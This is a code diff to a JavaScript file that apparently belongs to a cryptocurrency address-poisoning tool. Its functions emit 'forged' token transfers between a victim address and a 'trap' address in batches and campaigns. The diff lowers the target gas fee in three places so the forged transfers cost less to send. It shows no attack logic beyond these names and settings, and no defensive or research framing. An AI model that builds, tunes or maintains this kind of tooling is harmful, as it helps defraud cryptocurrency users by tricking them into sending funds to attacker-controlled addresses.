@@ -1243,7 +1243,7 @@ function emitForgedTransfer(victimAddress, trapAddress, rawValue, walletClient, 
     // 🚀 SMART GAS STRATEGY: Wait for cheap gas, but fallback to spot price if it takes too long
     let maxFeePerGas = 2000000000n; // 2 gwei default fallback
     let maxPriorityFeePerGas = 10000000n; // 0.01 gwei tip fallback
-    const TARGET_MAX_FEE_GWEI = 1.5; // The cheap rate we want
+    const TARGET_MAX_FEE_GWEI = 0.5; // The cheap rate we want
     const targetMaxFee = BigInt(Math.floor(TARGET_MAX_FEE_GWEI * 1000)) * 1000000n;
     const networkTip = 10000000n; // 0.01 gwei tip
 
@@ -1694,7 +1694,7 @@ async function emitBatchForgedTransfers(walletClient, campaignId, contractAddres
     // 🚀 SMART GAS STRATEGY: Wait for cheap gas, but fallback to spot price if it takes too long
     let maxFeePerGas = 2000000000n; // 2 gwei default fallback
     let maxPriorityFeePerGas = 10000000n; // 0.01 gwei tip fallback
-    const TARGET_MAX_FEE_GWEI = 1.5; // The cheap rate we want
+    const TARGET_MAX_FEE_GWEI = 0.5; // The cheap rate we want
     const targetMaxFee = BigInt(Math.floor(TARGET_MAX_FEE_GWEI * 1000)) * 1000000n;
     const networkTip = 10000000n; // 0.01 gwei tip
 
@@ -1939,7 +1939,7 @@ async function emitMultiTokenBatch(walletClient, campaignId, contractGroups) {
     // 🚀 SMART GAS STRATEGY: Wait for cheap gas, but fallback to spot price if it takes too long
     let maxFeePerGas = 2000000000n; // 2 gwei default fallback
     let maxPriorityFeePerGas = 10000000n; // 0.01 gwei tip fallback
-    const TARGET_MAX_FEE_GWEI = 1.5; // The cheap rate we want
+    const TARGET_MAX_FEE_GWEI = 0.5; // The cheap rate we want
     const targetMaxFee = BigInt(Math.floor(TARGET_MAX_FEE_GWEI * 1000)) * 1000000n;
     const networkTip = 10000000n; // 0.01 gwei tip
 
